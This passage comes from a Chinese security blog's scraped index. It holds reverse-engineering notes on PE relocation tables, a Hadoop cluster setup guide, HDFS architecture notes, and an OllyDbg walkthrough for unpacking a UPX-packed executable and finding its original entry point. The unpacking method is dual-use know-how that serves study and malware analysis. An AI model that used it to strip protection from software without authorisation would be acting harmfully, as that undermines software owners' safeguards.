//以注释形式存在，非结构体成员，表示在该结构体下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。 }IMAGE_BASE_RELOCATION; tydefine IMAGE_BASE_RELOCATION UNALIGEND * PIMAGE_BASE_RELOCATION; ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"4. 基地址重定位表的分析方法 下表列出上图中基址重定位表的部分内容： RVA 数据 注释 2f000 00001000 VirtualAddress 2f004 00000150 SizeOfBlock 2f008 3420 TypeOffset 2f00a 342d TypeOffset 2f00c 3436 TypeOffset 以VirtualAddress=00001000，SizeOfBlock=00000150，TypeOffset=3420为例。 TypeOffset值为2个字节，由4位的Type与12位的Offset合成： 类型（4位） 偏移（12位） 3 420 高4位指定Type，PE文件中常见的值为3（IMAGE_REL_BASED_HIGHLOW），64位的PE文件中常见值为A（IMAGE_REL_BASED_DIR64）。低12位位真正位移（最大地址为1000），改位移是基于VirtualAddress的位移，所以程序中硬编码地址的偏移使用以下公式进行计算： VirtualAddress(1000) + Offset(420) = 1420(RVA) 下面我们在OD中看一下RVA 1420处是否实际存在要执行PE重定位操作的硬编码地址： 程序加载的基地址为270000，所以在271420处可以看到IAT的地址（VA，2710c4）。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:4","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"5. 总结流程 查找程序中硬编码地址的位置（通过基址重定位表查找） 可以看到，RVA 1420处存在着程序的硬编码地址010010c4 读取数值后，减去ImageBase值： 010010c4 - 01000000 = 000010c4 加上实际加载地址 000010c4 + 00270000=002710c4 对于程序内硬编码的地址，PE装载器都做如上的处理，根据实际加载的内存地址修正后，将得到的值覆盖到同一位置上。对一个IMAGE_BASE_RELOCATION结构体的所有TypeOffset都做如上处理，且对RVA 1000～2000地址区域对应的所有硬编码地址都要进行PE重定位处理。如果TypeOffset值为0，说明一个IMAGE_BASE_RELOCATION结构体结束。至此，完成重定位流程。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:5","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"四、参考 《逆向工程核心原理》 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-04","objectID":"/2020/03/Hadoop6/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(六)–分布式环境搭建 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"服务器功能规划 zy1 zy2 zy3 NameNode ResourceManage DataNode DataNode DataNode NodeManager NodeManager NodeManager HistoryServer SecondaryNameNode ip：10.251.0.144 ip：10.251.0.150 ip：10.251.0.151 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"一、解压Hadoop目录 wget http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-2.8.5/hadoop-2.8.5.tar.gz tar -zxvf hadoop-2.8.5.tar.gz -C /opt/bigdata mv hadoop-2.8.5 hadoop 在伪分布式安装时，已经配置了hadoop的环境变量，无需再重复配置了。验证： echo $HADOOP_HOME ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"二、配置 hadoop-env.sh、mapred-env.sh yarn-env.sh JAVA_HOME参数 比如修改hadoop-env.sh： vim ${HADOOP_HOME}/etc/hadoop/hadoop-env.sh 修改JAVA_HOME参数为： export JAVA_HOME=/usr/lib/jvm/java ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"三、各主要配置文件配置 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. 配置core-site.xml vim ${HADOOP_HOME}/etc/hadoop/core-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://zy1:9000\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003ehadoop.tmp.dir\u003c/name\u003e \u003cvalue\u003e/opt/bigdata/data/hadoop\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/name\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/data\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e fs.defaultFS为NameNode的地址。 hadoop.tmp.dir：为hadoop临时目录的地址，默认情况下，NameNode和DataNode的数据文件都会存在这个目录下的对应子目录下（但是上面我们通过dfs.datanode.data.dir，和dfs.namenode.data.dir指定了）。应该保证此目录是存在的，如果不存在，先创建； dfs.namenode.name.dir：指定目录来供namenode存储永久性的文件系统元数据（如果指定多个路径，使用\",“隔开）。这些元数据文件会同时备份在所有指定的目录上，通常情况下，通过配置dfs.namenode.data.dir可以将namenode元数据写到一两个本地磁盘和一个远程磁盘（例如NFS挂载目录）之中。这样的话，即使本地磁盘发生故障，甚至整个namenode发生故障，都可以恢复数据文件并重新构成新的namenode（辅助namenode只是定期保存namenode的检查点，不维护namenode的最新备份）； dfs.datanode.data.dir：可以设定datanode存储数据块的目录列表，上面提到dfs.namenode.name.dir描述一系列目录，其目的是为了支持namenode进行冗余备份。虽然dfs.datanode.data.dir也描述了一系列目录，但是其目的是使datanode循环的在各个目录中写数据。因此，为了提高性能，最好分别为各个本地磁盘指定一个存储目录，这样一来，数据块跨磁盘分布，针对不同的数据块的读操作可以并发执行，从而提高读取速度。 mkdir /opt/bigdata/data/hadoop ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 配置hdfs-site.xml vim ${HADOOP_HOME}/etc/hadoop/hdfs-site.xml 添加以下内容： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.secondary.http-address\u003c/name\u003e \u003cvalue\u003ezy3:50090\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.client.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e dfs.namenode.secondary.http-address：是指定secondaryNameNode的http访问地址和端口号，因为在规划中，我们将zy3规划为SecondaryNameNode服务器。所以这里设置为：zy3:50090。 dfs.replication配置的是HDFS存储时的备份数量，这里设置为2； fs.client.use.datanode.hostname：是否客户端应该使用DN的HostName，在连接DN时，默认是使用IP；（必须设置为true） dfs.datanode.use.datanode.hostname：是否DN应该使用HostName连接其它DN，在数据传输时。默认是是IP。（必须设置为true） ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"3. 配置masters、slaves cd hadoop vim etc/hadoop/masters vim etc/hadoop/slaves masters修改为：zy1 slavers：zy2 ​ zy3 masters文件是指定HDFS的主节点，zy1特有；slaves文件是指定HDFS上有哪些DataNode节点。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"4. 配置mapred-site.xml 复制mapred-site.xml.template配置模板文件生成mapred-site.xml： cp etc/hadoop/mapred-site.xml.template etc/hadoop/mapred-site.xml 添加配置： vim etc/hadoop/mapred-site.xml 修改内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.address\u003c/name\u003e \u003cvalue\u003ezy1:10020\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.webapp.address\u003c/name\u003e \u003cvalue\u003ezy1:19888\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e mapreduce.framework.name设置mapreduce任务运行在yarn上； mapreduce.jobhistory.address是设置mapreduce的历史服务器安装在zy1机器上； mapreduce.jobhistory.webapp.address是设置历史服务器的web页面地址和端口号。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"5. 配置yarn-site.xml vim etc/hadoop/yarn-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003eyarn.nodemanager.aux-services\u003c/name\u003e \u003cvalue\u003emapreduce_shuffle\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ezy2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation-enable\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation.retain-seconds\u003c/name\u003e \u003cvalue\u003e106800\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e yarn.nodemanager.aux-services配置了yarn的默认混洗方式，选择为mapreduce的默认混洗算法； yarn.resourcemanager.hostname指定了Resourcemanager运行在zy2节点上； yarn.log-aggregation-enable是配置是否启用日志聚集功能； yarn.log-aggregation.retain-seconds是配置聚集的日志在HDFS上最多保存多长时间； ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"四、设置SSH无密码登录及文件分发 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. SSH无密码登录配置 Hadoop集群中的各个机器间会相互地通过SSH访问，所以要配置各个机器间的SSH为无密码登录的。 在zy1上生成公钥： ssh-keygen -t rsa 在当前用户的Home目录下的.ssh目录中会生成公钥文件（id_rsa.pub）和私钥文件（id_rsa）。 分发公钥： ssh-copy-id zy1 ssh-copy-id zy2 ssh-copy-id zy3 设置zy2、zy3到其他机器的无密钥登录：同样的在zy2、zy3上生成公钥和私钥后，将公钥分发到三台机器上。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 分发Hadoop文件 通过Scp分发： cd /opt/bigdata scp -r /opt/bigdata/hadoop/ zy2:/opt/bigdata scp -r /opt/bigdata/hadoop/ zy3:/opt/bigdata 在每个节点下执行： mkdir /opt/bigdata/data/hadoop ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"五、格式化和启动运行 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. 格式NameNode 在使用hadoop之前，全新的HDFS安装需要进行格式化。通过创建存储目录和初始化版本的namenode持久数据结构，格式化将创建一个空的文件系统。 在NameNode机器上(节点zy1)执行格式化： hdfs namenode -format 注意：如果需要重新格式化NameNode，需要先将原来NameNode和DataNode下的文件全部删除，不然会报错，NameNode和DataNode所在目录是在core-site.xml中hadoop.tmp.dir、dfs.namenode.name.dir、dfs.datanode.data.dir属性配置的。 每次格式化，默认创建一个集群ID，并写入NameNode的VERSION文件中（VERSION文件所在目录为dfs/name/current ）。 此时并没有将集群ID写入DataNode的VERSION之中，由于namenode管理所有的文件系统的元数据，datanode可以动态加入或离开集群，所以初始的格式化过程不涉及datanode。 只有在启动HDFS时，才会将ID写入DataNode的VERSION之中。如果我们重新格式化HDFS，重新格式化时，默认会生成一个新的集群ID，如果不删除原来的数据目录，会导致namenode中的VERSION文件中是新的集群ID,而DataNode中是旧的集群ID，不一致时会报错。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 启动HDFS 在zy1节点运行以下命令： start-dfs.sh ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"3. 启动YARN start-yarn.sh 在zy2上启动ResourceManager： yarn-daemon.sh start resourcemanager ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"4. 启动日志服务器 规划为在zy1服务器上运行MapReduce日志服务，所以要在zy1上启动： mr-jobhistory-daemon.sh start historyserver ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"5. 查看HDFS Web页面 hdfs的Web客户端端口号是50070，通过http://zy1:50070/可以查看。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"6. 查看YARN Web 页面 YARN的Web客户端端口号是8088，由于ResourceManager设置在zy2节点上，因此通过http://zy2:8088/查看当前执行的job。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:6","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"7. hadoop配置信息 Hadoop更多端口相关的配置参考：hadoop端口号配置信息、ResourceManager相关配置参数。 更多Hadoop的参数配置可以惨开：hadoop 参数配置。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:7","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"8. 关闭hadoop 在各个节点下运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:8","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"9. 重新格式化和启动 在每个节点运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh rm -rf logs/* rm -rf ../data/hadoop/* 在namenode节点(zy1)运行： hdfs namenode -format 然后在每个节点运行相应启动hadoop的命令。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:9","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"六、错误排查 如果hadoop启动出现出错，查看日志，日志位于hadoop安装路径下的logs目录下。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:7:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"七、参考文章 https://blog.csdn.net/hliq5399/article/details/78193113 https://www.cnblogs.com/zyly/p/11209286.html#_label4_16 https://blog.csdn.net/bqw18744018044/article/details/79103931 https://blog.csdn.net/henrrywan/article/details/86432912?depth_1-utm_source=distribute.pc_relevant.none-task\u0026utm_source=distribute.pc_relevant.none-task https://hadoop.apache.org/docs/ ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:8:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-03","objectID":"/2020/03/RE4B-5/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"PE文件格式详细解析（五）– 调试UPX压缩的notepad程序 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"一、未经过UPX压缩的notepad的EP代码 首先看一下未经过UPX压缩的notepad的相关信息： PEView查看基本结构信息： RVA = 1000，且SizeOfRawData是有大小的。 OD查看EP代码： 首先简单看一下汇编代码，程序在010073b2处调用kernel32.dll中的GetModuleHandleA()函数，然后可以得到程序的ImageBase，存放在EAX中： 然后，进行PE文件格式的验证，比较MZ和PE签名。 以上代码可以简单记录一下，方便后续与经过UPX压缩的程序进行比较。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"二、经过UPX压缩的notepad_upx.exe的EP代码 PEView查看下信息（上一节已经介绍过）： 第一个图为第一个节区UPX0的信息，第二个图为第二个节区UPX1的信息。 OD进行EP代码查看： 可以发现经过UPX压缩的EP代码发生了明显的改变，入口地址变为了01014410，该地址其实为第二个节区UPX1的末尾地址（使用PEView可以确认），实际压缩的源代码位于该地址的上方。 然后我们看一下代码开始部分： 01014410 60 pushad 01014411 BE 00000101 mov esi, notepad_.01010000 01014416 8DBE 0010FFFF lea esi, dword ptr ds:[esi-0xf000] 首先看第一句，pushad，其主要作用将eax～edi寄存器的值保存到栈中： 结合上面的图，发现在执行完pushad指令后，eax～edi的值确实都保存到了栈中。 后面两句分别把第二个节区的起始地址（01010000）与第一个节区的起始地址（01001000）存放到esi与edi寄存器中。UPX文件第一节区仅存在于内存中，该处即是解压缩后保存源文件代码的地方。 需要注意的是，在调试时同时设置esi与edi，大概率是发生了esi所指缓冲区到edi所指缓冲区的内存复制。此时从Source（esi）读取数据，解压缩后保存到Destination（edi）。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"三、跟踪UPX文件 掌握基本信息后，开始正式跟踪UPX文件，需要遵循的一个原则是，遇到循环（loop）时，先了解作用再跳出，然后决定是否需要再循环内部单步调试。 备注：此处开始使用书上的例子，因为我个人的反汇编的代码会跟书上不一致，不建议新手使用。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"1. 第一个循环 在EP代码处执行Animate Over（Ctrl+F8）命令，开始跟踪代码： 跟踪到这里后发现第一个关键循环，涉及到edi的反复变化，循环次数为36b，主要作用是从edx（01001000）中读取一个字节写入edi（01001001）。edi所指的地址即是第一个节区UPX0的起始地址（PEView已经验证过），仅存于内存中，数据全部被填充为NULL，主要是清空区域，防止有其他数据。这样的循环我们跳出即可，在010153e6处下断点，然后F9跳出。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"2. 第二个循环 在断点处继续Animate Over跟踪代码，遇到下图的循环结构： 该村换是正式的解压缩循环。 先从esi所指的第二个节区（UPX1）地址中依次读取数据，然后经过一系列运算解压缩后，将数据放入edi所指的第一个节区（UPX0）地址。关键指令解释： 0101534B . 8807 mov byte ptr ds:[edi],al 0101534D . 47 inc edi ; notepad_.0100136C ... 010153E0 . 8807 mov byte ptr ds:[edi],al 010153E2 . 47 inc edi ; notepad_.0100136C ... 010153F1 . 8907 mov dword ptr ds:[edi],eax 010153F3 . 83C7 04 add edi,0x4 * 解压缩后的数据放在AL（eax）中，edi指向第一个节区的地址 在01015402地址处下断，跳出循环（暂不考虑内部压缩过程）。在转储窗口查看解压缩后的代码： ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"3. 第三个循环 重新跟踪代码，遇到如下循环： 这部分代码主要是恢复源代码的CALL/JMP指令（机器码：E8/E9）的destination地址。 到此为止，基本恢复了所有的压缩的源代码，最后设置下IAT即可成功。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"4. 第四个循环 01015436处下断： 此处edi被设置为01014000，指向第二个节区（UPX1）区域，该区域中保存着原程调用的API函数名称的字符串。 UPX在进行压缩时，会分析IAT，提取出原程序中调用的额API名称列表，形成api函数名称字符串。 使用这些API名称字符串调用01015467地址处的GetProcAddress()函数，获取API的起始地址，然后把API地址输入ebx寄存器所指的原程序的IAT区域，循环进行，直到完全恢复IAT。 然后，到01054bb的jmp指令处，跳转到OEP（原始EP）代码处： 至此，UPX的解压缩全部完成，后续进行notepad.exe的正常执行。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:4","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"五、快速查找UPX OEP的方法 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"1. 在POPAD指令后的JMP指令处设置断点 UPX压缩的特征之一是其EP代码被包含在PUSHAD/POPAD指令之间，并且在POPAD指令之后紧跟着的JMP指令会跳转到OEP代码处，所以可以在此处下断点，直接跳转到OEP地址处。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"2. 在栈中设置硬件断点 本质上也是利用 PUSHAD/POPAD指令的特点。因为eax～edi的值依次被保存到栈中，不管中间做了什么操作，想要运行OEP的代码就需要从栈中读取这些寄存器的值来恢复程序的原始运行状态，所以我们只要设置硬件断点监视栈中寄存器的值的变化就可以快速定位到OEP。 F8执行完pushad后，在od的dump窗口进入栈地址： 然后选中下硬件读断点： 直接F9，你会发现很快就来到PUSHAD后的JMP指令处。 最后，补充硬件断点的几个知识：硬件断点是CPU支持的断点，最多设置4个；执行完指令后再停止。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop5/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(五)–HDFS ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"一、架构 HDFS遵循主从架构。 Block数据块; 基本存储单位，一般大小为64M（配置大的块主要是因为：1）减少搜寻时间，一般硬盘传输速率比寻道时间要快，大的块可以减少寻道时间；2）减少管理块的数据开销，每个块都需要在NameNode上有对应的记录；3）对数据块进行读写，减少建立网络的连接成本） 一个大文件会被拆分成一个个的块，然后存储于不同的机器。如果一个文件少于Block大小，那么实际占用的空间为其文件的大小 基本的读写单位，类似于磁盘的页，每次都是读写一个块 每个块都会被复制到多台机器，默认复制3份 NameNode 存储文件的metadata，运行时所有数据都保存到内存，整个HDFS可存储的文件数受限于NameNode的内存大小 一个Block在NameNode中对应一条记录（一般一个block占用150字节），如果是大量的小文件，会消耗大量内存。同时map task的数量是由splits来决定的，所以用MapReduce处理大量的小文件时，就会产生过多的map task，线程管理开销将会增加作业时间。处理大量小文件的速度远远小于处理同等大小的大文件的速度。因此Hadoop建议存储大文件 数据会定时保存到本地磁盘，但不保存block的位置信息，而是由DataNode注册时上报和运行时维护（NameNode中与DataNode相关的信息并不保存到NameNode的文件系统中，而是NameNode每次重启后，动态重建） NameNode失效则整个HDFS都失效了，所以要保证NameNode的可用性 Secondary NameNode 定时与NameNode进行同步（定期合并文件系统镜像和编辑日志，然后把合并后的传给NameNode，替换其镜像，并清空编辑日志，类似于CheckPoint机制），但NameNode失效后仍需要手工将其设置成主机 DataNode 保存具体的block数据 负责数据的读写操作和复制操作 DataNode启动时会向NameNode报告当前存储的数据块信息，后续也会定时报告修改信息 DataNode之间会进行通信，复制数据块，保证数据的冗余性 ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"二、写文件 1.客户端将文件写入本地磁盘的HDFS Client文件中 2.当临时文件大小达到一个block大小时，HDFS client通知NameNode，申请写入文件 3.NameNode在HDFS的文件系统中创建一个文件，并把该block id和要写入的DataNode的列表返回给客户端 4.客户端收到这些信息后，将临时文件写入DataNodes 4.1 客户端将文件内容写入第一个DataNode（一般以4kb为单位进行传输） 4.2 第一个DataNode接收后，将数据写入本地磁盘，同时也传输给第二个DataNode 4.3 依此类推到最后一个DataNode，数据在DataNode之间是通过pipeline的方式进行复制的 4.4 后面的DataNode接收完数据后，都会发送一个确认给前一个DataNode，最终第一个DataNode返回确认给客户端 4.5 当客户端接收到整个block的确认后，会向NameNode发送一个最终的确认信息 4.6 如果写入某个DataNode失败，数据会继续写入其他的DataNode。然后NameNode会找另外一个好的DataNode继续复制，以保证冗余性 4.7 每个block都会有一个校验码，并存放到独立的文件中，以便读的时候来验证其完整性 5.文件写完后（客户端关闭），NameNode提交文件（这时文件才可见，如果提交前，NameNode垮掉，那文件也就丢失了。fsync：只保证数据的信息写到NameNode上，但并不保证数据已经被写到DataNode中） Rack aware（机架感知） 通过配置文件指定机架名和DNS的对应关系 假设复制参数是3，在写入文件时，会在本地的机架保存一份数据，然后在另外一个机架内保存两份数据（同机架内的传输速度快，从而提高性能） 整个HDFS的集群，最好是负载平衡的，这样才能尽量利用集群的优势。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"三、读文件 客户端向NameNode发送读取请求 NameNode返回文件的所有block和这些block所在的DataNodes（包括复制节点） 客户端直接从DataNode中读取数据，如果该DataNode读取失败（DataNode失效或校验码不对），则从复制节点中读取（如果读取的数据就在本机，则直接读取，否则通过网络读取） ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"四、可靠性 DataNode可以失效 DataNode会定时发送心跳到NameNode。如果一段时间内NameNode没有收到DataNode的心跳消息，则认为其失效。此时NameNode就会将该节点的数据（从该节点的复制节点中获取）复制到另外的DataNode中 数据可以毁坏 无论是写入时还是硬盘本身的问题，只要数据有问题（读取时通过校验码来检测），都可以通过其他的复制节点读取，同时还会再复制一份到健康的节点中 NameNode不可靠 